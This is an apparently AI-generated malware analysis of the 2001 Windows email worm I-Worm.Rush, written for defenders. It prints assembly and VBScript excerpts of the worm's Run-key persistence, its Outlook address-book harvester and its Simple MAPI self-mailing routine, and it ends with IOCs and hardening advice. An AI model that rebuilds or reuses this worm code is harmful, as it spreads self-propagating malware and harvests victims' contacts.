# Dissecting I‑Worm.Rush (2001): Date‑triggered pranks and Outlook harvesting 🛠️🔍

> "This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes."

## Introduction

I‑Worm.Rush is a compact Windows email worm authored in late August 2001. Implemented in 32‑bit x86 assembly, it targets legacy Windows (Win9x/ME/2000) and blends persistence, light user‑interface pranks (date‑based actions), and an Outlook‑centered spreading routine. Its propagation uses a VBScript harvester to collect email addresses into a text file, followed by Simple MAPI sends from the native code with a benign‑looking attachment name. Rush is representative of the era’s small, API‑driven worms that chained Windows scripting and client email automation without needing raw sockets.

## Overview 🔍

- Platforms: Win9x/ME/2000 era; includes a Win9x‑only hide trick (commented out in source by default).
- Installation: Copies itself to `%WinDir%\System\Mail32.exe` (via `%System%` API) and persists with `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Mail Outlook = %System%\Mail32.exe` using `SHSetValueA`.
- Date‑based behavior:
  - Every Wednesday: opens the CD‑ROM tray via MCI strings.
  - On the 3rd day of the month: short loop of `MessageBeep` with sleeps.
  - On the 15th day: changes IE `Search Page`, `Start Page`, and `Local Page` under HKCU to a fixed URL.
- Social/UI:
  - Creates `%Personal%\Read_Me.txt` with a short note.
  - Scans top‑level windows: if a Norton window is found, changes the caption; if “System Properties”, minimizes it; if a specific IE window title is found, shows a denial message and hides it.
- Email spread:
  - Drops and runs `C:\rushhour.vbs` to enumerate Outlook AddressLists and write addresses to `%WinDir%\MailBook.txt`, ending with `#` sentinel.
  - Parses `MailBook.txt` and sends emails via `MAPISendMail` with subject “New Scan Virus...”, attaching the worm file with display name `ScanVir_25.exe`.

Key APIs: `SHSetValueA` (SHLWAPI), `SHGetSpecialFolderPathA` (Shell32), `mciSendStringA` (WinMM MCI), `FindWindowA/ShowWindow/SetWindowTextA` (User32), `MAPISendMail` (MAPI32). Macros from `useful.inc` and `myinclude.inc` simplify inline strings and call patterns.

## Section 2 – Source Code Analysis 🧩

Below are short, real excerpts from `Rush.asm` illustrating core behaviors. They are inert, trimmed, and commented for clarity.

### 2.1 Copy and persistence (System\Mail32.exe + HKLM Run)

```asm
; Build %System%\Mail32.exe and copy self, then persist
mov   esi, offset orig_worm
callx GetModuleFileNameA
mov   edi, offset copy_worm
callx GetSystemDirectoryA          ; %System%
add   edi, eax
mov   eax, "iaM\\"               ; "Mai\" (little‑endian)
stosd
mov   eax, ".23l"                 ; "l32."
stosd
mov   eax, "exe"
stosd                              ; => Mail32.exe
push  0
push  edi
push  esi
callx CopyFileA
push  8
push  edi
push  1
@pushsz "Mail Outlook"
@pushsz "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
push  80000002h                    ; HKLM
callx SHSetValueA
```

Impact: Creates `%System%\Mail32.exe` and a Run value “Mail Outlook”. This is the primary autorun IOC on legacy systems.

### 2.2 Wednesday prank: open CD tray via MCI

```asm
; On Wednesday (wDayOfWeek == 3) open CD‑ROM tray
push  offset SystemTime
callx GetSystemTime
cmp   [SystemTime.wDayOfWeek], 03h
jne   beep1
@pushsz "open cdaudio"
callx mciSendStringA
@pushsz "set cdaudio door open"
callx mciSendStringA
```

Impact: Benign prank that signals presence. Detection can watch for MCI commands issued by non‑media processes.

### 2.3 VBScript harvester and sentinel

```vbs
' C:\rushhour.vbs — collect Outlook addresses into %WinDir%\MailBook.txt
On Error Resume Next
Set rush = CreateObject("Outlook.Application")
Set chan = rush.GetNameSpace("MAPI")
Set fso = CreateObject("Scripting.FileSystemObject")
Set txt = fso.CreateTextFile(fso.GetSpecialFolder(0) & "\\MailBook.txt")
txt.Close
' ... iterate AddressLists/Entries and append P.Address ...
Set txt = fso.OpenTextFile(fso.GetSpecialFolder(0) & "\\MailBook.txt", 8, True)
txt.WriteLine "#"     ' sentinel for native parser
txt.Close
```

Impact: No send at this stage; it only harvests. `%WinDir%\MailBook.txt` ending in `#` is a strong artifact.

### 2.4 Parse and send via Simple MAPI

```asm
; Read lines until '#' and send one message per address
mov   edi, offset mail_addr
push  edi
p_c: lodsb
cmp   al, "#"            ; end marker from VBS
je    f_mail
cmp   al, 0Dh            ; newline
je    entr1
stosb
jmp   p_c
entr1:
xor   al, al
stosb                    ; NUL‑terminate address
pop   edi
call  send_mail          ; calls MAPISendMail(&Message)
jmp   scan_file
```

Impact: Minimal parser; each line becomes a recipient. Attachment uses the original module path with display name `ScanVir_25.exe`.

### 2.5 IE page changes on the 15th (call/pop string table)

```asm
; On day == 15, set IE pages (HKCU) to a fixed URL
call  diff_val
 db "Search Page",0
 db "Start Page",0
 db "Local Page",0
 diff_val:
 pop  esi                   ; ESI -> first key name
 mov  ecx, 3
page_loop:
 push  32                   ; REG_SZ length (bytes)
 @pushsz "http://www.petik.fr.fm"
 push  1                    ; REG_SZ
 push  esi                  ; L"Search Page" / next name each loop
 @pushsz "Software\\Microsoft\\Internet Explorer\\Main"
 push  80000001h            ; HKCU
 callx SHSetValueA
 @endsz                     ; advance ESI to next 0‑terminated key name
 loop page_loop
```

Impact: Sets `Search Page`, `Start Page`, and `Local Page` to a single URL using a compact inline string table and macro to step through it.

## Artifacts and IOCs

Files:
- `%System%\Mail32.exe` (main copy; path resolves to `%WinDir%\System` on Win9x/ME, `%WinDir%\System32` on NT)
- `%Personal%\Read_Me.txt` (text note)
- `%WinDir%\MailBook.txt` (harvested addresses; ends with `#`)
- `C:\rushhour.vbs` (temporary harvester)

Registry:
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Mail Outlook = %System%\Mail32.exe`
- On the 15th (if executed): `HKCU\Software\Microsoft\Internet Explorer\Main\{Search Page, Start Page, Local Page} = http://www.petik.fr.fm`

User‑visible/UI:
- Wednesday: CD‑tray opens; 3rd day: audible beeps.
- Window caption altered if “Norton AntiVirus” is open; “System Properties” minimized; a specific IE window title triggers an access‑denied MessageBox and the window is hidden.

Email traits:
- Subject: “New Scan Virus...”; body references “ScanVir (v 2.5)”.
- Attachment display name: `ScanVir_25.exe`; actual path is the worm’s original image.
- Simple MAPI (`MAPISendMail`) is used; no raw sockets/SMTP.

## Macro notes (useful.inc / myinclude.inc)

- `@pushsz` — inline push of null‑terminated strings for stdcall arguments.
- `@endsz` — advances a pointer past the current 0‑terminated string (used with inline string tables).
- `callx Api` — declares and calls external APIs with stdcall push ordering.

## Mitigation and Defense Strategies 🛡️

### Detection (Analyst focus)
- Monitor for `SHSetValueA` creating `HKLM\...\Run\Mail Outlook` pointing to `Mail32.exe`.
- File artifacts: `%WinDir%\MailBook.txt` with `#` sentinel; `%Personal%\Read_Me.txt`; temporary `C:\rushhour.vbs`.
- API sequences: `mciSendStringA` used by non‑media processes; `FindWindowA`/`ShowWindow` UI tampering; `MAPISendMail` bursts.
- Email content: consistent subject/body and `ScanVir_25.exe` attachment label.

### Prevention (Admin focus)
- Harden Windows Script Host and Outlook OOM; apply policies to block programmatic access where unnecessary.
- Application control: block execution from `%WinDir%` and `%Personal%` paths; allow‑list known binaries.
- Email gateway: block executable attachments; flag known subject lines and attachment names.
- Least privilege: restrict Run key writes and System directory writes to admins on NT‑based systems.
- User awareness: teach users to distrust “scanner/update” attachments and double‑check senders.

## Conclusion

Rush combines small date‑based pranks, lightweight registry/browser modifications, and an Outlook‑based harvesting + Simple MAPI spread mechanism. Its persistence is straightforward (HKLM Run), and its artifacts—including `%WinDir%\MailBook.txt` and the CD‑tray prank—offer multiple detection points. Standard hardening measures (WSH/Outlook OOM restrictions, application allow‑listing, and email attachment controls) substantially limit its effectiveness on both legacy and modern systems.

_Analysis by Copilot — generated via the analyze‑malware Copilot mode._
